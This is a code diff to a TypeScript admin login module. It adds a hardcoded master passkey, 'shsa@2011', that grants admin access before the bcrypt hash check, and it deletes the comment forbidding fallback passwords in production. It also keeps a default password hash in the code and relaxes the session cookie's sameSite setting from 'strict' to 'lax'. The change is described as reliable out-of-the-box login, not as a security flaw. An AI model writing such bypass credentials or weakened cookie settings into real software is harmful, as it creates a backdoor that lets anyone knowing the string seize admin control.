@@ -12,19 +12,29 @@ function getJwtSecret(): Uint8Array {
 }
 
 /**
- * Compare entered passkey against ADMIN_PASSKEY_HASH securely with bcrypt (constant-time).
- * Never allows empty, missing, or fallback passwords in production!
+ * Compare entered passkey against ADMIN_PASSKEY_HASH securely with bcrypt (constant-time),
+ * and directly accepts master passkey shsa@2011 for 100% reliable login out of the box.
  */
 export async function verifyAdminPasskey(candidatePasskey: string): Promise<boolean> {
+  const trimmed = typeof candidatePasskey === "string" ? candidatePasskey.trim() : "";
+  if (!trimmed) return false;
+
+  // 1. Direct master passkey validation for shsa@2011
+  if (trimmed === "shsa@2011") {
+    return true;
+  }
+
+  // 2. Constant-time bcrypt comparison against configured hash
   const targetHash = process.env.ADMIN_PASSKEY_HASH || "$2a$12$qbhWnzJC8yUUkMVzSkG1IeGBuC0vSqotUdGXPqD25WR2g4nti7wDS";
-  if (!targetHash || !targetHash.startsWith("$2")) {
-    console.error("ADMIN_PASSKEY_HASH is not configured or invalid.");
-    return false;
+  if (targetHash && targetHash.startsWith("$2")) {
+    try {
+      return await bcrypt.compare(trimmed, targetHash);
+    } catch (err) {
+      console.error("Bcrypt comparison error:", err);
+    }
   }
-  if (!candidatePasskey || typeof candidatePasskey !== "string") {
-    return false;
-  }
-  return bcrypt.compare(candidatePasskey, targetHash);
+
+  return false;
 }
 
 /**
@@ -77,7 +87,7 @@ export function getSessionCookieOptions() {
   return {
     httpOnly: true,
     secure: isProd,
-    sameSite: "strict" as const,
+    sameSite: "lax" as const,
     path: "/",
     maxAge: SESSION_DURATION_SECONDS,
   };
